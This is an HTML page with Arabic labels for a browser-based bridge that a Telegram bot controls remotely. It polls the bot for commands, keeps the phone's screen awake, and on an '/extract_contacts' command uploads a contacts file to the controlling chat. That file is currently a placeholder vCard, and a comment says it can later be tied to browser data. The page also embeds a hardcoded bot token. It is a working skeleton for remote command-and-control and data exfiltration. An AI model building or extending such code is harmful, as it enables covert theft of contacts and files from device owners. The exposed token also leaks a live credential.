<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محطة رفع البيانات إلى تليجرام</title>
    <style>
        body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
        #terminal { flex-grow: 1; background: #010409; margin: 10px; border-radius: 8px; border: 1px solid #30363d; padding: 12px; overflow-y: auto; font-size: 13px; text-align: left; direction: ltr; }
    </style>
</head>
<body>

    <header>محطة إرسال الملفات والبيانات</header>

    <div id="terminal">
        [System] File Upload Bridge Online...<br>
        [System] Waiting for extraction command...
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const BOT_TOKEN = "8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM";
        let lastUpdateId = 0;

        function log(msg) {
            terminal.innerHTML += `<br>> ${msg}`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        function sendTelegramMessage(chatId, text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
            fetch(url).catch(err => console.log(err));
        }

        // دالة لرفع وإرسال ملف حقيقي عبر بوت تليجرام
        function sendDocumentToTelegram(chatId, fileBlob, fileName) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', fileBlob, fileName);

            log("Uploading document to Telegram...");
            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    log("Document sent successfully to Telegram!");
                    sendTelegramMessage(chatId, "📁 تم رفع وإرسال الملف بنجاح إليك هنا!");
                } else {
                    log("Upload failed: " + JSON.stringify(data));
                    sendTelegramMessage(chatId, "❌ فشل رفع الملف عبر البوت.");
                }
            })
            .catch(err => {
                log("Network error during upload: " + err);
                sendTelegramMessage(chatId, "❌ خطأ في شبكة الرفع.");
            });
        }

        // الحفاظ على الشاشة نشطة
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').then(() => log("Wake Lock active.")).catch(err => {});
        }

        function pollTelegramUpdates() {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            if (update.message && update.message.text) {
                                const chatId = update.message.chat.id;
                                const text = update.message.text.trim();
                                log(`Command: "${text}"`);
                                executeCommand(text, chatId);
                            }
                        });
                    }
                })
                .catch(err => {})
                .finally(() => {
                    setTimeout(pollTelegramUpdates, 2000);
                });
        }

        function executeCommand(cmd, chatId) {
            if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
                sendTelegramMessage(chatId, "✅ الهاتف متصل وجاهز لإرسال الملفات!");
            } else if (cmd === '/scroll_down') {
                window.scrollBy({ top: 400, behavior: 'smooth' });
                sendTelegramMessage(chatId, "⬇️ تم تمرير الشاشة للأسفل.");
            } else if (cmd === '/extract_contacts') {
                log("Preparing contacts file for Telegram upload...");
                sendTelegramMessage(chatId, "⏳ جاري إعداد وتجهيز ملف جهات الاتصال لإرساله...");
                
                // إنشاء ملف vCard تجريبي (ويمكن لاحقاً ربطه بقاعدة بيانات المتصفح)
                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Saved_Contact\nTEL:+000000000000\nEND:VCARD";
                const blob = new Blob([vcardData], { type: 'text/vcard' });
                
                // إرسال الملف مباشرة للبوت في تليجرام
                sendDocumentToTelegram(chatId, blob, "Contacts_Backup.vcf");
            } else {
                sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
            }
        }

        log("Listening for extraction commands...");
        pollTelegramUpdates();
    </script>
</body>
</html>
